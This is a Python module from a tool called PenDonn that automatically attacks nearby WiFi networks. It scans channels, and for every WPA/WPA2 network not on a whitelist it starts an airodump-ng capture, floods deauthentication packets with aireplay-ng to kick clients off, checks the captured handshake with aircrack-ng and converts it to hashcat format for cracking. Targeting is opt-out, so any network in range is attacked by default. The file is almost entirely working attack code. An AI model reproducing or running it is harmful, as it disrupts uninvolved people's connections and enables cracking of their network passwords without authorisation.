"""
PenDonn WiFi Monitor Module
Handles WiFi scanning, channel hopping, and handshake capture.
"""

import os
import time
import threading
import subprocess
import logging
from datetime import datetime
from typing import List, Dict, Optional, Set
from scapy.all import sniff, Dot11, Dot11Beacon, Dot11ProbeResp, Dot11Elt, EAPOL
import json

logger = logging.getLogger(__name__)


class WiFiMonitor:
    """WiFi monitoring and handshake capture"""
    
    def __init__(self, config: Dict, database):
        """Initialize WiFi monitor"""
        self.config = config
        self.db = database
        
        self.monitor_interface = config['wifi']['monitor_interface']
        self.attack_interface = config['wifi']['attack_interface']
        self.channel_hop_interval = config['wifi']['channel_hop_interval']
        self.handshake_timeout = config['wifi']['handshake_timeout']
        
        self.whitelist_ssids = set(config['whitelist']['ssids'])
        self.running = False
        self.current_channel = 1
        
        # Track discovered networks
        self.networks = {}  # bssid -> network_info
        self.handshake_dir = "./handshakes"
        os.makedirs(self.handshake_dir, exist_ok=True)
        
        # Active captures
        self.active_captures = {}  # bssid -> capture_info
        
        logger.info("WiFi Monitor initialized")
    
    def start(self):
        """Start WiFi monitoring"""
        logger.info("Starting WiFi monitor...")
        
        # Enable monitor mode on interfaces
        self._enable_monitor_mode(self.monitor_interface)
        self._enable_monitor_mode(self.attack_interface)
        
        self.running = True
        
        # Start channel hopping thread
        channel_thread = threading.Thread(target=self._channel_hopper, daemon=True)
        channel_thread.start()
        
        # Start packet sniffing
        sniff_thread = threading.Thread(target=self._packet_sniffer, daemon=True)
        sniff_thread.start()
        
        # Start handshake capture monitor
        capture_thread = threading.Thread(target=self._capture_monitor, daemon=True)
        capture_thread.start()
        
        logger.info("WiFi monitor started")
    
    def stop(self):
        """Stop WiFi monitoring"""
        logger.info("Stopping WiFi monitor...")
        self.running = False
        
        # Restore managed mode
        self._disable_monitor_mode(self.monitor_interface)
        self._disable_monitor_mode(self.attack_interface)
        
        logger.info("WiFi monitor stopped")
    
    def _enable_monitor_mode(self, interface: str):
        """Enable monitor mode on interface"""
        try:
            # Kill interfering processes
            subprocess.run(['airmon-ng', 'check', 'kill'], 
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # Bring interface down
            subprocess.run(['ip', 'link', 'set', interface, 'down'], check=True)
            
            # Set monitor mode
            subprocess.run(['iw', interface, 'set', 'monitor', 'control'], check=True)
            
            # Bring interface up
            subprocess.run(['ip', 'link', 'set', interface, 'up'], check=True)
            
            logger.info(f"Monitor mode enabled on {interface}")
        except subprocess.CalledProcessError as e:
            logger.error(f"Failed to enable monitor mode on {interface}: {e}")
    
    def _disable_monitor_mode(self, interface: str):
        """Disable monitor mode on interface"""
        try:
            subprocess.run(['ip', 'link', 'set', interface, 'down'], check=True)
            subprocess.run(['iw', interface, 'set', 'type', 'managed'], check=True)
            subprocess.run(['ip', 'link', 'set', interface, 'up'], check=True)
            logger.info(f"Monitor mode disabled on {interface}")
        except subprocess.CalledProcessError as e:
            logger.error(f"Failed to disable monitor mode on {interface}: {e}")
    
    def _channel_hopper(self):
        """Hop through WiFi channels"""
        channels = list(range(1, 14))  # 2.4GHz channels
        channel_idx = 0
        
        while self.running:
            try:
                channel = channels[channel_idx % len(channels)]
                subprocess.run(['iw', 'dev', self.monitor_interface, 'set', 'channel', str(channel)],
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                self.current_channel = channel
                channel_idx += 1
                time.sleep(self.channel_hop_interval)
            except Exception as e:
                logger.error(f"Channel hopping error: {e}")
                time.sleep(1)
    
    def _packet_sniffer(self):
        """Sniff WiFi packets to discover networks"""
        def packet_handler(pkt):
            if not self.running:
                return
            
            try:
                if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
                    self._process_beacon(pkt)
                elif pkt.haslayer(EAPOL):
                    self._process_eapol(pkt)
            except Exception as e:
                logger.debug(f"Packet processing error: {e}")
        
        try:
            sniff(iface=self.monitor_interface, prn=packet_handler, store=0)
        except Exception as e:
            logger.error(f"Packet sniffing error: {e}")
    
    def _process_beacon(self, pkt):
        """Process beacon/probe response frames"""
        try:
            bssid = pkt[Dot11].addr3
            
            # Extract SSID
            ssid = ""
            if pkt.haslayer(Dot11Elt):
                ssid_layer = pkt[Dot11Elt]
                while isinstance(ssid_layer, Dot11Elt):
                    if ssid_layer.ID == 0:  # SSID element
                        ssid = ssid_layer.info.decode('utf-8', errors='ignore')
                        break
                    ssid_layer = ssid_layer.payload
            
            if not ssid or ssid in self.whitelist_ssids:
                return
            
            # Extract channel
            channel = self.current_channel
            if pkt.haslayer(Dot11Elt):
                elt = pkt[Dot11Elt]
                while isinstance(elt, Dot11Elt):
                    if elt.ID == 3:  # DS Parameter set
                        channel = ord(elt.info)
                        break
                    elt = elt.payload
            
            # Detect encryption
            stats = pkt[Dot11Beacon].network_stats() if pkt.haslayer(Dot11Beacon) else {}
            crypto = stats.get('crypto', set())
            encryption = self._get_encryption_type(crypto)
            
            # Signal strength
            signal = -(256 - ord(pkt.notdecoded[-4:-3])) if hasattr(pkt, 'notdecoded') and len(pkt.notdecoded) >= 4 else -100
            
            # Store/update network
            if bssid not in self.networks:
                self.networks[bssid] = {
                    'ssid': ssid,
                    'bssid': bssid,
                    'channel': channel,
                    'encryption': encryption,
                    'signal': signal,
                    'last_seen': datetime.now()
                }
                
                # Add to database
                network_id = self.db.add_network(ssid, bssid, channel, encryption, signal)
                self.networks[bssid]['id'] = network_id
                
                logger.info(f"New network discovered: {ssid} ({bssid}) on channel {channel} - {encryption}")
                
                # Start handshake capture if WPA/WPA2
                if 'WPA' in encryption and bssid not in self.active_captures:
                    self._start_handshake_capture(bssid, ssid, channel)
            else:
                self.networks[bssid]['last_seen'] = datetime.now()
                self.networks[bssid]['signal'] = signal
        
        except Exception as e:
            logger.debug(f"Beacon processing error: {e}")
    
    def _get_encryption_type(self, crypto: set) -> str:
        """Determine encryption type"""
        if not crypto:
            return "Open"
        
        encryption_parts = []
        if 'WPA2' in crypto:
            encryption_parts.append('WPA2')
        if 'WPA' in crypto:
            encryption_parts.append('WPA')
        if 'WEP' in crypto:
            encryption_parts.append('WEP')
        
        return '/'.join(encryption_parts) if encryption_parts else "Unknown"
    
    def _process_eapol(self, pkt):
        """Process EAPOL packets (handshake frames)"""
        try:
            bssid = pkt[Dot11].addr3
            if bssid in self.active_captures:
                capture_info = self.active_captures[bssid]
                capture_info['eapol_count'] += 1
                
                # Check if we have full handshake (4 EAPOL frames)
                if capture_info['eapol_count'] >= 4:
                    self._finalize_handshake(bssid)
        
        except Exception as e:
            logger.debug(f"EAPOL processing error: {e}")
    
    def _start_handshake_capture(self, bssid: str, ssid: str, channel: int):
        """Start capturing handshake for a network"""
        try:
            capture_file = os.path.join(self.handshake_dir, f"{bssid.replace(':', '')}.cap")
            
            # Start airodump-ng to capture handshake
            cmd = [
                'airodump-ng',
                '--bssid', bssid,
                '--channel', str(channel),
                '--write', capture_file,
                '--output-format', 'cap',
                self.attack_interface
            ]
            
            process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            self.active_captures[bssid] = {
                'ssid': ssid,
                'channel': channel,
                'process': process,
                'capture_file': capture_file + '-01.cap',  # airodump-ng adds -01
                'start_time': time.time(),
                'eapol_count': 0
            }
            
            logger.info(f"Started handshake capture for {ssid} ({bssid})")
            
            # Send deauth packets to force handshake
            threading.Thread(target=self._send_deauth, args=(bssid, channel), daemon=True).start()
        
        except Exception as e:
            logger.error(f"Failed to start handshake capture for {bssid}: {e}")
    
    def _send_deauth(self, bssid: str, channel: int):
        """Send deauth packets to trigger handshake"""
        try:
            # Wait a bit before deauthing
            time.sleep(5)
            
            # Send deauth packets
            subprocess.run([
                'aireplay-ng',
                '--deauth', '10',
                '-a', bssid,
                self.attack_interface
            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=30)
            
            logger.info(f"Sent deauth packets to {bssid}")
        
        except Exception as e:
            logger.debug(f"Deauth error for {bssid}: {e}")
    
    def _capture_monitor(self):
        """Monitor active captures and finalize timeouts"""
        while self.running:
            try:
                current_time = time.time()
                
                for bssid in list(self.active_captures.keys()):
                    capture_info = self.active_captures[bssid]
                    elapsed = current_time - capture_info['start_time']
                    
                    if elapsed > self.handshake_timeout:
                        # Check if handshake was captured
                        if self._verify_handshake(capture_info['capture_file']):
                            self._finalize_handshake(bssid)
                        else:
                            logger.warning(f"Handshake capture timeout for {capture_info['ssid']}")
                            self._stop_capture(bssid)
                
                time.sleep(10)
            
            except Exception as e:
                logger.error(f"Capture monitor error: {e}")
                time.sleep(5)
    
    def _verify_handshake(self, capture_file: str) -> bool:
        """Verify if capture file contains valid handshake"""
        if not os.path.exists(capture_file):
            return False
        
        try:
            # Use aircrack-ng to verify handshake
            result = subprocess.run(
                ['aircrack-ng', capture_file],
                capture_output=True,
                text=True,
                timeout=10
            )
            
            # Check if handshake is present in output
            return 'handshake' in result.stdout.lower()
        
        except Exception as e:
            logger.debug(f"Handshake verification error: {e}")
            return False
    
    def _finalize_handshake(self, bssid: str):
        """Finalize handshake capture"""
        try:
            capture_info = self.active_captures[bssid]
            capture_file = capture_info['capture_file']
            
            # Convert to hashcat format
            hc_file = capture_file.replace('.cap', '.hc22000')
            subprocess.run([
                'hcxpcapngtool',
                '-o', hc_file,
                capture_file
            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # Stop capture
            self._stop_capture(bssid)
            
            # Add to database
            network_id = self.networks[bssid]['id']
            quality = "good" if capture_info['eapol_count'] >= 4 else "unknown"
            
            self.db.add_handshake(
                network_id=network_id,
                bssid=bssid,
                ssid=capture_info['ssid'],
                file_path=capture_file,
                quality=quality
            )
            
            logger.info(f"Handshake captured for {capture_info['ssid']} ({bssid})")
        
        except Exception as e:
            logger.error(f"Error finalizing handshake for {bssid}: {e}")
    
    def _stop_capture(self, bssid: str):
        """Stop capture process for a network"""
        if bssid in self.active_captures:
            try:
                capture_info = self.active_captures[bssid]
                capture_info['process'].terminate()
                capture_info['process'].wait(timeout=5)
            except Exception as e:
                logger.debug(f"Error stopping capture for {bssid}: {e}")
            finally:
                del self.active_captures[bssid]
    
    def get_discovered_networks(self) -> List[Dict]:
        """Get list of discovered networks"""
        return list(self.networks.values())
    
    def add_to_whitelist(self, ssid: str):
        """Add SSID to whitelist"""
        self.whitelist_ssids.add(ssid)
        logger.info(f"Added {ssid} to whitelist")
    
    def remove_from_whitelist(self, ssid: str):
        """Remove SSID from whitelist"""
        self.whitelist_ssids.discard(ssid)
        logger.info(f"Removed {ssid} from whitelist")
    
    def get_status(self) -> Dict:
        """Get current monitor status"""
        return {
            'running': self.running,
            'current_channel': self.current_channel,
            'networks_discovered': len(self.networks),
            'active_captures': len(self.active_captures),
            'whitelist_count': len(self.whitelist_ssids)
        }
